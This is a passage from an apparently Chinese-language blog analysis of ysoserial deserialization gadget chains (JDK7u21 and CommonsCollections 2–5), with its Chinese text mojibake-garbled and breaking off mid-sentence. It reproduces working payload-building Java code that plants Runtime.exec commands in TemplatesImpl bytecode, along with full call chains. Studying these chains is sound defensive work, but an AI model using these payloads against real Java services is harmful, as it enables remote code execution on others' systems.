æ­¤åªæ”¾ä¸€ä¸ª key ä¸º <code>f5a5a608</code>ï¼Œvalue ä¸ºåŒ…å«æ¶æ„ä»£ç çš„ templates ã€‚</p><ul><li>è¿™é‡Œæ˜¯ä¸ºäº†èƒ½å¤Ÿæ‰§è¡Œ equals ç„¶åè§¦å‘ <code>TemplatesImpl.getOutputProperties</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ¶æ„ä»£ç </span></span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å“ˆå¸Œç¢°æ’å€¼</span></span><br><span class="line">String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€  HashMap</span></span><br><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>); <span class="comment">// value ä»»æ„å€¼ï¼Œè®© LinkedHashSet.add æˆåŠŸ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ HashMap åˆ›å»º AnnotationInvocationHandler</span></span><br><span class="line">InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">    <span class="comment">// è®¾ç½®ä¸º Templates ç±»å‹</span></span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ AnnotationInvocationHandler åˆ›å»º Templates ä»£ç†æ¥å£</span></span><br><span class="line">Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»§æ‰¿ HashSet</span></span><br><span class="line">LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// maintain order</span></span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(proxy); <span class="comment">// è¿›è¡Œä¸€æ¬¡æ¯”è¾ƒï¼Œå¦‚æœä¸€å¼€å§‹æ”¾çš„ templates æ— æ³•æ·»åŠ  proxy</span></span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ”¾å…¥å®é™…çš„ valueï¼ˆæ›¿æ¢ï¼‰</span></span><br><span class="line">map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.util.Gadgets ä½¿ç”¨ javaassist åº“åˆ›å»ºåŒ…å«æ¶æ„ä»£ç çš„ç±»ï¼Œæ¶æ„ä»£ç å¯ä»¥åœ¨æ— å‚æ„é€ å‡½æ•°æˆ– static block ä¸­ï¼Œå°†æ¶æ„ä»£ç æ·»åŠ åˆ° TemplatesImpl çš„ <code>_bytecodes</code> å˜é‡ä¸­ï¼Œç­‰ååºåˆ—åŒ–æ—¶è°ƒç”¨ <code>getOutputProperties()</code> æˆ– <code>newTransformer()</code> è§¦å‘æ¶æ„ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            command,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">    String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">        command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">        <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd); <span class="comment">// åˆ›å»º static block</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">    CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">   clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å­—èŠ‚ç </span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®è¿›å…¥ defineTransletClasses() çš„æ¡ä»¶</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>); <span class="comment">// å¿…é¡»å¡«å……</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance()); <span class="comment">// å¯é€‰</span></span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><blockquote><p> åˆ©ç”¨ TemplatesImpl æ‰¿è½½æ¶æ„è°ƒç”¨é“¾<br> PriorityQueue åœ¨ååºåˆ—åŒ–æ—¶æ¯”è¾ƒå…ƒç´ ï¼ˆæ¢å¤é¡ºåºï¼‰ï¼Œè€Œæ¯”è¾ƒæ“ä½œå¯ä»¥è‡ªå®šä¹‰<br> åˆ©ç”¨ InvokerTransformer æ„é€ æ¯”è¾ƒæ“ä½œï¼Œåœ¨æ¯”è¾ƒæ—¶è§¦å‘ transform æ“ä½œï¼Œè¿›ä¸€æ­¥è§¦å‘ TemplatesImpl</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-collections 4.0<ul><li>CommonsCollections1 å¯ä»¥åœ¨è¯¥ç‰ˆæœ¬å¤ç°ï¼Œæ”¹ä¸º <code>Map lazyMap = LazyMap.lazyMap(innerMap,transformerChain);</code> è®¾ç½® factory</li></ul></li><li>jdk7u21<ul><li>ä½¿ç”¨ TemplatesImpl çš„å˜é‡ <code>_bytecodes</code> æ‰¿è½½æ¶æ„å­—èŠ‚ç </li></ul></li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/rP7TSdGYfbiRmD2.png" ><p>ysoserial.payloads.CommonsCollections2 åˆ›å»º PriorityQueue å¯¹è±¡ï¼Œå¹¶å°†å…¶ comparator è®¾ç½®ä¸ºåŒ…å«æ¶æ„ transformer å¯¹è±¡çš„ TransformingComparatorã€‚</p><p>PriorityQueue ååºåˆ—åŒ–æ—¶æœ€åä¼šè°ƒç”¨ <code>heapify -&gt; siftDown</code>ï¼ˆå°†æ— åºé˜Ÿåˆ—è¿˜åŸä¸ºä¼˜å…ˆé˜Ÿåˆ—ï¼‰ï¼Œ å½“ comparator ä¸ä¸ºç©ºæ—¶è¿›ä¸€æ­¥è°ƒç”¨ <code>siftDownUsingComparator -&gt; conparator.compare</code>  æœ€ç»ˆé€šè¿‡è°ƒç”¨ <code> transformer.transform(TemplatesImpl)</code>å®ç° RCEã€‚</p><ul><li><code>PriorityQueue.heapify()</code> ç”¨äºæ„é€ äºŒå‰å †</li><li><code>InvokerTransformer.transform(TemplatesImpl) -&gt; TemplatesImpl.newTransformer()</code></li></ul><p>TemplatesImpl ç±»ä¸»è¦çš„ä½œç”¨ä¸ºï¼š</p><ul><li>ä½¿ç”¨ <code>_bytecodes</code> æˆå‘˜å˜é‡å­˜å‚¨æ¶æ„å­—èŠ‚ç  ( æ¶æ„ class -&gt; byte array )</li><li>æä¾›åŠ è½½æ¶æ„å­—èŠ‚ç å¹¶è§¦å‘æ‰§è¡Œçš„å‡½æ•°ï¼ŒåŠ è½½åœ¨ <code>defineTransletClasses()</code> æ–¹æ³•ä¸­ï¼Œæ–¹æ³•è§¦å‘ä¸º <code>getOutputProperties()</code> æˆ– <code>newTransformer()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ„é€  TemplatesImpl</span></span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// å‡çš„æ–¹æ³•åç§° toString</span></span><br><span class="line"><span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ transformer æ„é€  PriorityQueue</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line">    </span><br><span class="line"><span class="comment">// å…ˆè®¾ç½®æ­£å¸¸çš„å˜é‡å€¼</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹æ–¹æ³•åç§°</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ›¿æ¢é˜Ÿåˆ—å†…çš„å˜é‡</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates; <span class="comment">// jdk7u21</span></span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><blockquote><p>CC2(source) + CC1(sink)<br>åˆ©ç”¨ TemplatesImpl æ‰¿è½½æ¶æ„è°ƒç”¨é“¾<br>ä½¿ç”¨ InstantiateTransformer ä»£æ›¿ InvokerTransformerï¼Œé€šè¿‡ TrAXFilter çš„æ„é€ æ–¹æ³•è°ƒç”¨ newTransformer<br>æ”¾åœ¨ç‰¹æ€§å’Œ TransformedMap ç›¸åŒçš„ lazyMap ä¸­<br>é€šè¿‡åŠ¨æ€ä»£ç† AnnotationInvocationHandler çš„ååºåˆ—åŒ–è§¦å‘</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-collections 3.1</li><li>jdk7u21<ul><li>ä½¿ç”¨ <code>TemplatesImpl</code> çš„å˜é‡ <code>_bytecodes</code> æ‰¿è½½æ¶æ„å­—èŠ‚ç </li></ul></li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                                Class.newInstance()</span><br><span class="line">                                    TrAXFilter#TrAXFilter()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br><span class="line">                                        TemplatesImpl.getTransletInstance()</span><br><span class="line">                                        TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                            ClassLoader.defineClass()</span><br><span class="line">                                            Class.newInstance()</span><br><span class="line">                                              ...</span><br><span class="line">                                                MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                                ...</span><br><span class="line">                                                    Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/RNrPcWsiQm2Ak8G.png"><p>InstantiateTransformer çš„ transform æ–¹æ³•ä¼šåˆ›å»ºç±»å®ä¾‹ã€‚TrAXFilter ç±»çš„æ„é€ å‡½æ•°æ¥å— Templates ç±»å‹çš„å‚æ•°ï¼Œå¹¶æ‰§è¡Œ <code>TemplatesImpl.newTransformer</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">    TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.CommonsCollections3#getObject å¯ä»¥çœ‹å‡ºå‰é¢å’Œ CC2 ä¸€æ ·æ„é€  templatesImpl æ‰¿è½½æ¶æ„ä»£ç ï¼Œä¸­é—´ä½¿ç”¨ InstantiateTransformer æ„é€ é“¾å¼è§¦å‘å™¨ ChainedTransformerï¼Œæœ€åå’Œ CC1 ä¸€æ ·ç”¨ LazyMap å’Œ AnnotationInvocationHandler åŠ¨æ€ä»£ç†å°è£…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ„é€  TemplatesImp æ‰¿è½½æ¶æ„ä»£ç </span></span><br><span class="line">Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line"><span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class="line"><span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŒ CC1</span></span><br><span class="line">    <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><blockquote><p>CC2 + CC3<br>åˆ©ç”¨ InstantiateTransformer æ„é€ æ‰§è¡Œé“¾</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-collections 4.0</li><li>jdk7u21<ul><li>ä½¿ç”¨ <code>TemplatesImpl</code> çš„å˜é‡ <code>_bytecodes</code> æ‰¿è½½æ¶æ„å­—èŠ‚ç </li></ul></li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InstantiateTransformer.transform()</span><br><span class="line">                            Class.newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        ClassLoader.defineClass()</span><br><span class="line">                                        Class.newInstance()</span><br><span class="line">                                          ...</span><br><span class="line">                                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                            ...</span><br><span class="line">                                                Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/IkfLuarVRoy5Sni.png"><p>ysoserial.payloads.CommonsCollections4#getObject ç”¨ ChainedTransformer ä»£æ›¿äº† InvokerTransformer ä½œä¸ºæ¯”è¾ƒå™¨ï¼Œä¸”æ„é€ æ–¹å¼åŒ CC3ï¼Œåˆ©ç”¨ InstantiateTransformer è§¦å‘ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    ConstantTransformer constant = <span class="keyword">new</span> ConstantTransformer(String.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mock method name until armed</span></span><br><span class="line">Class[] paramTypes = <span class="keyword">new</span> Class[] &#123; String.class &#125;;</span><br><span class="line">Object[] args = <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line">InstantiateTransformer instantiate = <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">paramTypes, args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// grab defensively copied arrays</span></span><br><span class="line">paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123; constant, instantiate &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create queue with numbers</span></span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> TransformingComparator(chain));</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// swap in values to arm</span></span><br><span class="line">Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><blockquote><p>å‰é¢ RMI ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ä¸­æåˆ°<br>å°† CC1 ä¸­çš„ AnnotationInvocationHandler æ›¿æ¢ä¸º BadAttributeValueExpException<br>åˆ©ç”¨ CC1 ä¸­çš„ LazyMap æ„é€  TiedMapEntryï¼Œå†ç”¨äºæ„é€  BadAttributeValueExpException</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-collections 3.1 ~ 3.2.1</li><li>jdk 1.8</li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        BadAttributeValueExpException.readObject()</span><br><span class="line">            TiedMapEntry.toString()</span><br><span class="line">                LazyMap.get()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/09/16/4tevUmukcFwMQT1.jpg" ><p>åœ¨ BadAttributeValueExpException çš„ readObject 